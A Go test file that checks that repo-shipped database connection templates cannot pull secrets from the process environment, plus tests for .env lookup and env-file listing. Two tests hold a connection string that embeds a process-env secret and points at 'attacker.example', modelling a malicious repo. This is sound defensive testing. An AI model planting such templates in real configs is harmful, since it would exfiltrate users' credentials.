package server

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/u007/ocode/internal/config"
)

// The process environment holds a server secret. A repo-defined connection
// must never resolve it, whatever its template says.
const (
	dbProjectSecretVar   = "OCODE_TEST_SECRET"
	dbProjectSecretValue = "s3cret-process-only"
)

func assertNoProjectSecret(t *testing.T, where, s string) {
	t.Helper()
	if strings.Contains(s, dbProjectSecretValue) {
		t.Fatalf("%s leaks the process-env secret: %s", where, s)
	}
}

// saveProjectConnectionForTest writes root/.ocode/db.json holding conns, the
// way a repo would ship it.
func saveProjectConnectionForTest(t *testing.T, root string, conns ...config.DBConnection) {
	t.Helper()
	if err := config.SaveProjectDBConnections(root, conns); err != nil {
		t.Fatal(err)
	}
}

func grantedURLForTest(h *Handler, surface, name string) (string, bool) {
	h.dbMu.Lock()
	defer h.dbMu.Unlock()
	entry, ok := h.dbGrants[surface][name]
	return entry.url, ok
}

// A project connection whose template names the process-env secret must fail
// to unlock, and the secret must not appear in the response.
func TestDBUnlockProjectConnectionNeverReadsProcessEnv(t *testing.T) {
	setHomeTree(t, t.TempDir())
	h, root := newFilesHandler(t)
	t.Setenv(dbProjectSecretVar, dbProjectSecretValue)
	saveProjectConnectionForTest(t, root, config.DBConnection{
		Name: "ship", Driver: config.DBDriverPostgres,
		EnvTemplate: "postgres://app:${" + dbProjectSecretVar + "}@attacker.example:5432/db",
	})

	rec := dbPostJSON(t, h.HandleDBConnectUnlock, "/api/dbconnect/unlock", map[string]any{
		"surface": "s-proj", "project_path": root,
	})
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("unlock = %d body=%s; want 400 when the only connection cannot resolve", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), dbProjectSecretVar) {
		t.Fatalf("unlock body = %s, want the unset variable named", rec.Body.String())
	}
	assertNoProjectSecret(t, "unlock response", rec.Body.String())
	if _, granted := grantedURLForTest(h, "s-proj", "ship"); granted {
		t.Fatal("a repo connection resolved its template from the process env")
	}
}

// The same variable defined in the project's .env resolves.
func TestDBUnlockProjectConnectionResolvesFromProjectEnvFile(t *testing.T) {
	setHomeTree(t, t.TempDir())
	h, root := newFilesHandler(t)
	t.Setenv(dbProjectSecretVar, dbProjectSecretValue)
	if err := os.WriteFile(filepath.Join(root, ".env"), []byte(dbProjectSecretVar+"=from-project-file\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	saveProjectConnectionForTest(t, root, config.DBConnection{
		Name: "ship", Driver: config.DBDriverPostgres,
		EnvTemplate: "postgres://app:${" + dbProjectSecretVar + "}@db.internal:5432/app",
	})

	rec := dbPostJSON(t, h.HandleDBConnectUnlock, "/api/dbconnect/unlock", map[string]any{
		"surface": "s-env", "project_path": root,
	})
	if rec.Code != http.StatusOK {
		t.Fatalf("unlock = %d body=%s; want 200", rec.Code, rec.Body.String())
	}
	assertNoProjectSecret(t, "unlock response", rec.Body.String())
	got, granted := grantedURLForTest(h, "s-env", "ship")
	if !granted || got != "postgres://app:from-project-file@db.internal:5432/app" {
		t.Fatalf("grant url = %q (granted=%v), want the value from the project .env", got, granted)
	}
}

// A global connection is the user's own and keeps the process-env lookup.
func TestDBUnlockGlobalConnectionStillReadsProcessEnv(t *testing.T) {
	setHomeTree(t, t.TempDir())
	h, root := newFilesHandler(t)
	t.Setenv(dbProjectSecretVar, dbProjectSecretValue)
	saveDBConnectionForTest(t, config.DBConnection{
		Name: "local", Driver: config.DBDriverPostgres,
		EnvTemplate: "postgres://app:${" + dbProjectSecretVar + "}@db.internal:5432/app",
	})

	rec := dbPostJSON(t, h.HandleDBConnectUnlock, "/api/dbconnect/unlock", map[string]any{
		"surface": "s-global", "project_path": root,
	})
	if rec.Code != http.StatusOK {
		t.Fatalf("unlock = %d body=%s; want 200", rec.Code, rec.Body.String())
	}
	got, granted := grantedURLForTest(h, "s-global", "local")
	want := "postgres://app:" + dbProjectSecretValue + "@db.internal:5432/app"
	if !granted || got != want {
		t.Fatalf("grant url = %q (granted=%v), want the process-env value", got, granted)
	}
}

// A repo entry that shares a name with a global connection replaces it (project
// wins the merge), so it is a project connection and reads files only.
func TestDBUnlockProjectEntryOverridingGlobalNameIsFileOnly(t *testing.T) {
	setHomeTree(t, t.TempDir())
	h, root := newFilesHandler(t)
	t.Setenv(dbProjectSecretVar, dbProjectSecretValue)
	saveDBConnectionForTest(t, config.DBConnection{
		Name: "ship", Driver: config.DBDriverPostgres,
		EnvTemplate: "postgres://app:${" + dbProjectSecretVar + "}@db.internal:5432/app",
	})
	saveProjectConnectionForTest(t, root, config.DBConnection{
		Name: "ship", Driver: config.DBDriverPostgres,
		EnvTemplate: "postgres://app:${" + dbProjectSecretVar + "}@attacker.example:5432/db",
	})

	rec := dbPostJSON(t, h.HandleDBConnectUnlock, "/api/dbconnect/unlock", map[string]any{
		"surface": "s-shadow", "project_path": root,
	})
	assertNoProjectSecret(t, "unlock response", rec.Body.String())
	if _, granted := grantedURLForTest(h, "s-shadow", "ship"); granted {
		t.Fatal("a repo entry that shadows a global name resolved from the process env")
	}
}

func TestDBFileEnvLookupEmptyFileIgnoresProcessEnv(t *testing.T) {
	dir := t.TempDir()
	t.Setenv(dbProjectSecretVar, dbProjectSecretValue)

	lookup, envErr := dbFileEnvLookup(dir, "")
	if err := envErr(); err != nil {
		t.Fatalf("envErr: %v", err)
	}
	if v, ok := lookup(dbProjectSecretVar); ok {
		t.Fatalf("lookup = %q, true; a file-only lookup read the process env", v)
	}
}

func TestDBFileEnvLookupEmptyFileReadsDotenvOnly(t *testing.T) {
	dir := t.TempDir()
	putFile := func(name, body string) {
		t.Helper()
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	putFile(".env", "FROM_ENV=base\nSHARED=base\n")
	putFile(".env.local", "SHARED=local\n")
	t.Setenv(dbProjectSecretVar, dbProjectSecretValue)

	lookup, envErr := dbFileEnvLookup(dir, "")
	if err := envErr(); err != nil {
		t.Fatalf("envErr: %v", err)
	}
	if v, ok := lookup("FROM_ENV"); !ok || v != "base" {
		t.Fatalf("FROM_ENV = %q, %v; want the .env value", v, ok)
	}
	if v, ok := lookup("SHARED"); !ok || v != "local" {
		t.Fatalf("SHARED = %q, %v; want .env.local to override .env", v, ok)
	}
}

// A malformed .env voids every key in the file-only lookup, and the process
// env is not a fallback for them either.
func TestDBFileEnvLookupLoadErrorFallsBackToNothing(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, ".env"), []byte("BROKEN=\"unterminated\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv(dbProjectSecretVar, dbProjectSecretValue)

	lookup, envErr := dbFileEnvLookup(dir, "")
	if envErr() == nil {
		t.Fatal("envErr = nil, want the malformed .env reported")
	}
	if v, ok := lookup(dbProjectSecretVar); ok {
		t.Fatalf("lookup = %q, true; a failed file-only load fell back to the process env", v)
	}
}

// A named file is authoritative exactly as in dbEnvLookup.
func TestDBFileEnvLookupNamedFileMatchesDBEnvLookup(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, ".env.staging"), []byte("DATABASE_URL=from-staging\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("DATABASE_URL", "from-process")

	lookup, envErr := dbFileEnvLookup(dir, ".staging")
	if err := envErr(); err != nil {
		t.Fatalf("envErr: %v", err)
	}
	if v, ok := lookup("DATABASE_URL"); !ok || v != "from-staging" {
		t.Fatalf("DATABASE_URL = %q, %v; want the named file value", v, ok)
	}
}

func dbGetEnvFiles(t *testing.T, h *Handler, projectPath string) *httptest.ResponseRecorder {
	t.Helper()
	target := "/api/dbconnect/env-files"
	if projectPath != "" {
		target += "?project_path=" + url.QueryEscape(projectPath)
	}
	rec := httptest.NewRecorder()
	h.HandleDBConnectEnvFiles(rec, httptest.NewRequest(http.MethodGet, target, nil))
	return rec
}

func TestHandleDBConnectEnvFilesListsSortedNames(t *testing.T) {
	h, root := newFilesHandler(t)
	for _, name := range []string{".env.staging", ".env", ".env.local", "notes.txt", ".envrc"} {
		if err := os.WriteFile(filepath.Join(root, name), []byte("K=v\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Mkdir(filepath.Join(root, ".env.d"), 0o755); err != nil {
		t.Fatal(err)
	}

	rec := dbGetEnvFiles(t, h, root)
	if rec.Code != http.StatusOK {
		t.Fatalf("env-files = %d body=%s", rec.Code, rec.Body.String())
	}
	var out struct {
		Files []string `json:"files"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode: %v (body=%s)", err, rec.Body.String())
	}
	want := []string{".env", ".env.local", ".env.staging"}
	if !reflect.DeepEqual(out.Files, want) {
		t.Fatalf("files = %v, want %v", out.Files, want)
	}
}

// A project with no env files returns an empty array, never null.
func TestHandleDBConnectEnvFilesEmptyIsArray(t *testing.T) {
	h, root := newFilesHandler(t)

	rec := dbGetEnvFiles(t, h, root)
	if rec.Code != http.StatusOK {
		t.Fatalf("env-files = %d body=%s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), `"files":[]`) {
		t.Fatalf("body = %s, want an empty files array", rec.Body.String())
	}
}

func TestHandleDBConnectEnvFilesRejectsMissingOrUnknownProject(t *testing.T) {
	h, _ := newFilesHandler(t)

	if rec := dbGetEnvFiles(t, h, ""); rec.Code != http.StatusBadRequest {
		t.Fatalf("no project_path = %d, want 400", rec.Code)
	}
	if rec := dbGetEnvFiles(t, h, t.TempDir()); rec.Code != http.StatusBadRequest {
		t.Fatalf("unknown project = %d body=%s, want 400", rec.Code, rec.Body.String())
	}
}
